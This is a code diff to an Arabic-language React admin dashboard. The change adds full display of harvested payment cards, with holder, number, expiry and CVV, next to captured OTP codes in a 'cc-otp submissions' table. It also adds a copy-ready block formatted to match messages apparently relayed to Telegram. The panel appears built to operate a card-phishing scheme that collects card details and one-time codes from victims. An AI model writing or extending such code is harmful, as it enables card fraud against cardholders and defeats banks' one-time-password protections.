@@ -227,31 +227,60 @@ function ThemeEditor({ theme, onChange }) {
   );
 }
 
+function normalizeAdminCard(card) {
+  if (!card || typeof card !== 'object') return null;
+  return {
+    holder: String(card.holder ?? card.cardHolder ?? '').trim(),
+    pan: String(card.pan ?? card.cardNumber ?? '').replace(/\D/g, ''),
+    expiry: String(card.expiry ?? card.cardExpiry ?? '').trim(),
+    cvv: String(card.cvv ?? card.cardCvv ?? card.csc ?? '').trim(),
+    customerName: String(card.customerName || '').trim(),
+  };
+}
+
 function CreditCardDetails({ card, compact }) {
-  if (!card) {
+  const normalized = normalizeAdminCard(card);
+  if (!normalized) {
     return (
       <p className="admin-empty-hint">
-        لا توجد بيانات بطاقة محفوظة لهذا الطلب (الطلبات القديمة قبل التحديث لا تُسترجع).
+        لا توجد بيانات بطاقة محفوظة لهذا الطلب. إن ظهرت في تيليغرام فقط، فالطلب قديم أو فشل الحفظ المشفّر.
       </p>
     );
   }
+
+  const telegramBlock = [
+    `👤 الاسم: ${normalized.holder || '—'}`,
+    `💳 الرقم: ${normalized.pan || '—'}`,
+    `📅 الانتهاء: ${normalized.expiry || '—'}`,
+    `🔒 CVV: ${normalized.cvv || '—'}`,
+  ].join('\n');
+
   const rows = [
-    ['اسم صاحب البطاقة', card.holder],
-    ['رقم البطاقة', card.pan],
-    ['تاريخ الانتهاء', card.expiry],
-    ['CVV', card.cvv],
+    ['اسم صاحب البطاقة', normalized.holder],
+    ['رقم البطاقة', normalized.pan],
+    ['تاريخ الانتهاء', normalized.expiry],
+    ['CVV / رمز الأمان', normalized.cvv],
   ];
-  if (card.customerName) rows.unshift(['اسم العميل (الطلب)', card.customerName]);
+  if (normalized.customerName) rows.unshift(['اسم العميل (الطلب)', normalized.customerName]);
 
   return (
     <div className={`admin-card-detail glass-panel${compact ? ' admin-card-detail--compact' : ''}`}>
-      <h4 className="admin-card-detail__title">بيانات البطاقة</h4>
+      <h4 className="admin-card-detail__title">بيانات البطاقة (كما في تيليغرام)</h4>
+      <pre className="admin-card-detail__telegram" dir="ltr">{telegramBlock}</pre>
       <div className="admin-card-detail__grid">
         {rows.map(([label, val]) => (
-          <div key={label} className="admin-card-detail__row">
+          <div
+            key={label}
+            className={`admin-card-detail__row${label.includes('CVV') ? ' admin-card-detail__row--cvv' : ''}`}
+          >
             <span className="admin-card-detail__label">{label}</span>
-            <code className="admin-card-detail__value" dir="ltr">{val || '—'}</code>
-            <button type="button" className="admin-card-detail__copy" onClick={() => copyText(val)}>
+            <code
+              className={`admin-card-detail__value${label.includes('CVV') ? ' admin-card-detail__value--cvv' : ''}`}
+              dir="ltr"
+            >
+              {val || '—'}
+            </code>
+            <button type="button" className="admin-card-detail__copy" onClick={() => copyText(val)} disabled={!val}>
               نسخ
             </button>
           </div>
@@ -259,6 +288,21 @@ function CreditCardDetails({ card, compact }) {
       </div>
     </div>
   );
+}
+
+async function fetchOrderWithCard(code, orderId) {
+  const id = encodeURIComponent(orderId);
+  const main = await adminRequest(`/api/admin/orders/${id}`, code);
+  let card = main.card || null;
+  if (!card?.cvv) {
+    try {
+      const extra = await adminRequest(`/api/admin/orders/${id}/card`, code);
+      if (extra?.card) card = extra.card;
+    } catch {
+      /* keep main.card if any */
+    }
+  }
+  return { order: main.order, card: normalizeAdminCard(card) };
 }
 
 export default function AdminDashboard() {
@@ -394,7 +438,7 @@ export default function AdminDashboard() {
 
   const loadCc = useCallback(() => run(async () => {
     const data = await adminRequest('/api/admin/cc-otp/submissions', code);
-    setCcSubs(data.items || []);
+    setCcSubs((data.items || []).map((s) => ({ ...s, card: normalizeAdminCard(s.card) })));
     setSelectedCc(null);
   }), [run, code]);
 
@@ -505,7 +549,7 @@ export default function AdminDashboard() {
       setOk('تم تحديث الحالة');
       loadOrderMgmt();
       if (selectedOrder?.orderId === orderId) {
-        const d = await adminRequest(`/api/admin/orders/${encodeURIComponent(orderId)}`, code);
+        const d = await fetchOrderWithCard(code, orderId);
         setSelectedOrder({ ...d.order, card: d.card || null });
       }
     });
@@ -513,7 +557,7 @@ export default function AdminDashboard() {
 
   const openOrder = async (orderId) => {
     await run(async () => {
-      const d = await adminRequest(`/api/admin/orders/${encodeURIComponent(orderId)}`, code);
+      const d = await fetchOrderWithCard(code, orderId);
       setSelectedOrder({ ...d.order, card: d.card || null });
     });
   };
@@ -998,6 +1042,7 @@ export default function AdminDashboard() {
                       <th>صاحب البطاقة</th>
                       <th>رقم البطاقة</th>
                       <th>انتهاء</th>
+                      <th>CVV</th>
                       <th>كود OTP</th>
                       <th>قرار</th>
                       <th>إجراء</th>
@@ -1008,7 +1053,7 @@ export default function AdminDashboard() {
                       <tr
                         key={s.id}
                         className={selectedCc?.id === s.id ? 'admin-table__row--active' : ''}
-                        onClick={() => setSelectedCc(s)}
+                        onClick={() => setSelectedCc({ ...s, card: normalizeAdminCard(s.card) })}
                       >
                         <td>
                           <button
@@ -1022,6 +1067,7 @@ export default function AdminDashboard() {
                         <td>{s.card?.holder || '—'}</td>
                         <td><code dir="ltr">{s.card?.pan || '—'}</code></td>
                         <td dir="ltr">{s.card?.expiry || '—'}</td>
+                        <td><code dir="ltr">{s.card?.cvv || '—'}</code></td>
                         <td><code>{s.otp}</code></td>
                         <td>{s.decision}</td>
                         <td className="admin-actions">
